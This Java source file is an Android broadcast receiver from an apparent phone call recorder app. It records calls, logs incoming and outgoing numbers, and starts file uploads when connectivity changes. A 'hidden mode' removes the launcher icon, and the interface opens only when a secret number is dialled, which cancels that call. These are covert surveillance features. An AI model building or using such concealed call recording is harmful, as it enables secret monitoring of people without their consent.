package phonerecorder.kivsw.com.faithphonerecorder.os;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.telephony.PhoneNumberUtils;
import android.telephony.TelephonyManager;

import javax.inject.Inject;

import phonerecorder.kivsw.com.faithphonerecorder.model.ErrorProcessor.IErrorProcessor;
import phonerecorder.kivsw.com.faithphonerecorder.model.persistent_data.ICallInfoKeeper;
import phonerecorder.kivsw.com.faithphonerecorder.model.persistent_data.IJournal;
import phonerecorder.kivsw.com.faithphonerecorder.model.settings.ISettings;
import phonerecorder.kivsw.com.faithphonerecorder.model.task_executor.TaskExecutor;
import phonerecorder.kivsw.com.faithphonerecorder.model.utils.MyConfiguration;
import phonerecorder.kivsw.com.faithphonerecorder.ui.main_activity.MainActivity;

/**
 * Created by ivan on 4/23/18.
 */

public class AppReceiver extends android.content.BroadcastReceiver{

    @Inject
    ISettings settings;

    @Inject
    IJournal journal;

    @Inject
    ICallInfoKeeper callInfoKeeper;

    @Inject
    TaskExecutor taskExecutor;

    @Inject
    IErrorProcessor errorProcessor;

    @Override
    public void onReceive(Context context, Intent intent) {
        MyConfiguration.waitForDebugger();  // for debugging process
        MyApplication.getComponent().inject(this);

        journal.journalAdd(intent);
        try {
            processIntent(context, intent);
        }catch(Throwable t)
        {
            errorProcessor.onError(t);
        }
    };

    protected void processIntent(Context context, Intent intent)
    {
        String action = intent.getAction();
        switch (action) {
            case Intent.ACTION_NEW_OUTGOING_CALL:
                outgoingCall(context, intent);
                break;
            case Intent.ACTION_BOOT_COMPLETED:
                setLauncherIcon(context, intent);
                setWatchdogTimer(context);
                break;
            case ConnectivityManager.CONNECTIVITY_ACTION:
                doDataSave(context, intent);
                break;
            case TelephonyManager.ACTION_PHONE_STATE_CHANGED:
                phoneStateChanged(context, intent);
                break;
            case WatchdogTimer.ACTION_WATCHDOG_TIMER:
                doDataSave(context, intent);
                break;
        }
    }

    protected void doDataSave(Context context, Intent intent)
    {
        taskExecutor.startFileSending();
        setWatchdogTimer(context);
    };
    protected void setLauncherIcon(Context context, Intent intent)
    {

        boolean visible= !settings.getHiddenMode();
        LauncherIcon.setVisibility(context, visible);
    }

    protected void setWatchdogTimer(Context context)
    {
        WatchdogTimer.setTimer(context);
    };

    protected void phoneStateChanged(Context context, Intent intent)
    {
        if (!settings.getEnableCallRecording())
            return;

        TelephonyManager tm=(TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
        switch (tm.getCallState())
        {
            case TelephonyManager.CALL_STATE_IDLE: // the end of the current conversation
                stopRecording(context);
                break;

            case TelephonyManager.CALL_STATE_OFFHOOK: // the begin of the current conversation
                startRecording(context);
                break;

            case TelephonyManager.CALL_STATE_RINGING: // saves the income phone number
                String phoneNumber=intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER );
                callInfoKeeper.setCallInfo(phoneNumber, true);
                break;
        };


    }
    protected void outgoingCall(Context context, Intent intent)
    {
        String phoneNumber=intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        if(phoneNumber==null)
            phoneNumber="";

        String secretNumber = settings.getSecretNumber();
        if (PhoneNumberUtils.compare(phoneNumber, secretNumber)) {  // shows the UI
            //android.os.SystemClock.sleep(3000); // wait 1 sec, in order to hide secret code
            MainActivity.showActivity(context);
            setResultData(null);
            return;
        }

        if (settings.getEnableCallRecording()) {
            // saves the outgoing phone number
            callInfoKeeper.setCallInfo(phoneNumber, false);

        }

    }

    protected void startRecording(Context context)
    {
        ICallInfoKeeper.CallInfo callInfo = callInfoKeeper.getCallInfo();

        taskExecutor.startCallRecording();
    };
    protected void stopRecording(Context context)
    {
        ICallInfoKeeper.CallInfo callInfo = callInfoKeeper.getCallInfo();

        taskExecutor.stopCallRecording();
    };
}
